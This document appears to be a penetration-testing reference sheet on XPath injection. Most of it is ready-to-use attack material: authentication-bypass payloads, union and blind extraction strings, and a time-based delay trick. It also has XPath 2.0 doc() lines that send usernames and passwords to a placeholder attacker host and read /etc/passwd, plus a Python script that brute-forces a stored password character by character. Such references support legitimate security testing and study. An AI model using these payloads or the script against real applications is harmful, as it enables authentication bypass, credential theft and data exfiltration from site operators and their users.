# XPath Injection

> **Summary**: Injection attack that manipulates XPath queries to extract data from or bypass authentication in XML-backed applications.
> **Impact**: Authentication bypass, full XML document exfiltration, blind data extraction, and in XPath 2.0 environments SSRF via the `doc()` function.
> **Typical Severity**: High

---

## Detection

### Indicators
- Application uses XML files as data stores (instead of or alongside a database)
- Login forms or search features that query XML documents
- Error messages containing XPath syntax (e.g., "Invalid expression", "XPathException")
- User input reflected in XML-based responses

### Automated Detection
```bash
# Test for XPath errors with common metacharacters
' " ] ) -- and observe error responses
# Use Burp Suite with XPath-specific payloads
```

### Manual Detection
1. Input a single quote `'` and observe for XPath-related errors
2. Input `' or '1'='1` in username/password and check for auth bypass
3. Compare responses between `' or '1'='1` (TRUE) and `' or '1'='2` (FALSE)
4. If differential responses exist, the parameter is injectable

---

## Exploitation

### Prerequisites
- User input is concatenated into XPath expressions without sanitization
- Application queries XML data using XPath 1.0 or 2.0

### XPath Syntax Reference

**Node Selection**:

| Query | Description |
|-------|-------------|
| `nodename` | Select all child nodes with that name |
| `/` | Select from root node |
| `//` | Select descendants anywhere in document |
| `.` | Current context node |
| `..` | Parent of context node |
| `@attr` | Select attribute node |
| `text()` | Select text content of node |

**Predicate Operators**:

| Operator | Description |
|----------|-------------|
| `=`, `!=` | Equality / Inequality |
| `<`, `<=`, `>`, `>=` | Comparison |
| `and`, `or` | Logical operators |
| `+`, `-`, `*`, `div`, `mod` | Arithmetic |

**Wildcards**:

| Query | Description |
|-------|-------------|
| `*` | Any element node |
| `@*` | Any attribute node |
| `node()` | Any node of any type |

### Step-by-Step

1. **Identify injection point** -- locate inputs that feed into XPath queries (login, search, filters)
2. **Confirm injection** -- use `' or '1'='1` to test for boolean-based response changes
3. **Determine query structure** -- use error messages or blind techniques to understand the XPath expression
4. **Extract schema** -- enumerate node names, depth, and structure using blind injection
5. **Exfiltrate data** -- extract values character-by-character via `substring()` and `string-length()`
6. **Success criteria** -- authenticated as another user or retrieved XML document contents

### Authentication Bypass Payloads

| Description | Username | Resulting Query |
|-------------|----------|-----------------|
| Basic OR bypass | `admin' or '1'='1` | `//user[username='admin' or '1'='1' and password='<HASH>']` |
| Position-based bypass | `' or position()=1 or '` | `//user[username='' or position()=1 or '' and password='<HASH>']` |
| Contains bypass | `' or contains(.,'admin') or '` | `//user[username='' or contains(.,'admin') or '' and password='<HASH>']` |
| Null injection | `' or 1]%00` | `//user[username='' or 1]` (rest truncated) |
| Double OR | `' or true() or '` | `//user[username='' or true() or '' and password='']` |
| Wildcard match | `' or /* or '` | Matches any element |
| Select by position | `' or position()=2 or '` | Select second user entry |
| Admin name match | `admin' or '` | `//user[username='admin' or '' and password='']` |

### String Extraction (Union-based)

When output is reflected in the response:

```
') or 1=1 or ('                             # Get all names
') or 1=1] | //user/password[('')=('        # Get all names and passwords
') or 2=1] | //user/node()[('')=('          # Get all values
')] | //./node()[('')=('                    # Get all values
')] | //password%00                         # All passwords (null injection)
')]/../*[3][text()!=(''                     # All passwords via sibling
')] | //user/*[1] | a[('                    # User IDs
')] | //user/*[2] | a[('                    # Usernames
')] | //user/*[3] | a[('                    # Passwords
```

### Blind Data Exfiltration

| Objective | Payload | Description |
|-----------|---------|-------------|
| Node name length | `invalid' or string-length(name(/*[1]))=<N> and '1'='1` | Brute-force length of root node name |
| Node name chars | `invalid' or substring(name(/*[1]),<POS>,1)='<CHAR>' and '1'='1` | Extract node name character-by-character |
| Child node count | `invalid' or count(/*[1]/*)=<N> and '1'='1` | Count children of root node |
| Value length | `invalid' or string-length(//user[1]/username)=<N> and '1'='1` | Length of target value |
| Value extraction | `invalid' or substring(//user[1]/username,<POS>,1)='<CHAR>' and '1'='1` | Extract value character-by-character |

### Schema Discovery (Blind)

Enumerate the full XML tree structure step-by-step:

```
and count(/*) = 1                        # Number of root nodes
and count(/*[1]/*) = <N>                 # Children of root
and count(/*[1]/*[1]/*) = <N>            # Children of first child
and name(/*[1]) = "root"                 # Confirm root node name
and substring(name(/*[1]/*[1]),1,1)='a'  # First char of child name
```

### Time-Based Blind XPath Injection

Force expensive computation to create measurable time delays:

```xpath
# Exponential processing -- causes significant delay if condition is true
invalid' or substring(//user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```

The expression `count((//.)[count((//.))])` forces the parser to iterate over every node exponentially, creating a detectable time difference.

### XPath 2.0 -- SSRF via doc() and doc-available()

XPath 2.0 supports `doc()` which can fetch external XML documents:

```xpath
# Out-of-band data exfiltration
doc(concat("http://<ATTACKER_HOST>/oob/", /users/user[1]/username))
doc(concat("http://<ATTACKER_HOST>/oob/", encode-for-uri(/users/user[1]/username)))

# Use doc-available() for boolean-based OOB
doc-available(concat("http://<ATTACKER_HOST>/oob/", /users/user[1]/password))

# Read local files
substring((doc('file:///etc/passwd')/*[1]/*[1]/text()[1]),1,1) = 'r'
```

### Proof of Concept

```python
import requests
import string

url = "<TARGET_URL>"
alphabet = string.ascii_letters + string.digits + "{}_()"

# Step 1: Determine password length
length = 0
for i in range(50):
    payload = f"' or string-length(//user[1]/password)={i} and '1'='1"
    r = requests.get(url, params={"username": payload})
    if "<SUCCESS_INDICATOR>" in r.text:
        length = i
        break

# Step 2: Extract password character-by-character
password = ""
for i in range(1, length + 1):
    for char in alphabet:
        payload = f"' or substring(//user[1]/password,{i},1)='{char}' and '1'='1"
        r = requests.get(url, params={"username": payload})
        if "<SUCCESS_INDICATOR>" in r.text:
            password += char
            break

print(f"Password: {password}")
```

---

## Bypasses

- **Null byte injection**: `%00` to truncate the XPath expression
- **Unicode encoding**: bypass input filters with encoded quotes and parentheses
- **Nested expressions**: use `contains()`, `starts-with()`, `string-length()` to avoid direct value comparison
- **Comment truncation**: some XPath processors allow comment-like sequences
- **Case variation**: XML is case-sensitive but application logic may not validate consistently

---

## Escalation

- **Full document extraction**: use union-based injection `| //text()` to dump entire XML
- **SSRF via doc()**: XPath 2.0 `doc()` function enables server-side requests to internal hosts
- **Local file read**: `doc('file:///etc/passwd')` when XPath 2.0 is available
- **OOB exfiltration**: exfiltrate data via DNS/HTTP using `doc(concat("http://attacker/",<DATA>))`
- **Credential reuse**: extracted passwords may work on other services

---

## Tools

| Tool | Usage |
|------|-------|
| [xcat](https://xcat.readthedocs.io/) | Automated XPath injection exploitation |
| [xxxpwn](https://github.com/feakk/xxxpwn) | Blind XPath injection tool |
| [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) | Enhanced xxxpwn with optimizations |
| [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer) | GUI-based blind XPath exploitation |
| [XmlChor](https://github.com/Harshal35/XMLCHOR) | XPath injection exploitation framework |
| Burp Suite Intruder | Manual character-by-character brute-force |

---

## References

- [PayloadsAllTheThings - XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- [OWASP Testing for XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection)
- [W3Schools XPath Syntax](https://www.w3schools.com/xml/xpath_syntax.asp)

---

**See also**: [SQL Injection](sqli.md) | [LDAP Injection](ldap-injection.md) | [XXE](xxe.md)
